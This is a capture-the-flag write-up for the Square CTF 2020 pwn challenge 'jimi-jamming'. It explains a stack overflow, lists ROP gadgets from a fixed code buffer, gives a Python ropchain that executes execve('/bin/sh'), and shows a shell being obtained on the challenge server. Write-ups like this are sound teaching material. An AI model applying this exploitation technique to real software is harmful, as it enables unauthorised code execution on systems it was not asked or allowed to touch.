jimi-jamming
============

This challenge was part of Square CTF 2020.

Challenge description:
```
Out of the frying pan? Back into the JAM JAR WITH YOU
nc challenges.2020.squarectf.com 9001
```

* Points: 300
* Topics: pwn
* Given files: `jimi-jamming`, `libc.so.6`

## Approach
Let's check the mitigations techniques:
```bash
$ checksec jimi-jamming
[*] './jimi-jamming'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Similar to the [other challenge](../jimi-jam), this looks like there might be a stack overflow involved.

Loading the binary in a decompiler turns out, the binary first initializes a `ROPJAIL` buffer (size: 0x1000 bytes).
Said buffer is allocated by `posix_memalign` and aligned to page size (0x1000).
The binary then fills the entile `ROPJAIL` buffer with pseudo random data, such that it contains the same content in every execution.
Also, every 16th byte is a `\xc3`, which is the opcode for `ret`.
We are then able to modify 10 bytes in the `ROPJAIL` buffer with 10 bytes that we provide (Awesome!).
After that, the entire `ROPJAIL` buffer is mapped `rx`, so we can't change it afterwards.

In this challenge we don't get a leak - but we also don't need any leak.

Instead, the binary provides a buffer overflow in the `vuln()` function.
We can write 0x80 bytes to a buffer of size 0x8 bytes.
There is one limitation though: Every long of the first half of our input must either be `< 0x200000000` or point into the `ROPJAIL` buffer.

This is everything we need to know, to exploit this binary. So, what do we do? 
Let's use rop gadgets from the `ROPJAIL` buffer to trigger a `execve` system call; And if necessary we can inject our own code (upto 10 bytes) into the `ROPJAIL` buffer.

Luckily, [`ropper`](https://github.com/sashs/ropper) also can find rop gadgets in raw blobs.
Among other gadgets the `ROPJAIL` buffer contains the following (which we are all going to use):

```
0xdcf:   pop rax; ret;
0xd3f:   pop rsi; ret;
0x7df:   pop rdx; ret;
0xdaf:   pop rdi; ret;
```

Thus, we can set all registers for the system call.
If we specify `'\x0f\x05' + '/bin/sh\0'` as the 10 bytes that are written to the `ROPJAIL` buffer, we can trigger the system call (`'\x0f\x05'`) and provide `/bin/sh` in `rdi`.
Also, we need to set `rax` to `0x3b`, since this is the `execve` syscall number.

Therefore, the ropchain looks like this:
```python
ropchain = [
	pop_rsi,          # Set rsi to 0 (argv)
	0,
	pop_rdx,          # Set rdx to 0 (envp)
	0,
	pop_rax,          # Set syscall number (execve)
	0x3b,
	pop_rdi,          # Set filename parameter to '/bin/sh'
	jail_leak + 0x2,
	jail_leak,        # Trigger the syscall;
]
```

We only need to send padding bytes (`'\0'*32`) to put the ropchain at the right place.
That's all we need to do!

## Exploit
You can find the exploit in [`x.py`](./x.py).

Just run it:
```bash
$ ./x.py remote
[*] './jimi-jamming'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] './libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.2020.squarectf.com on port 9001: Done
[*] Jail @ address 0x5609d6a07000
[*] Sending ropchain
[*] Switching to interactive mode
$ cat flag.txt
flag{ret_is_the_same_as_sigint_imo}
$
```
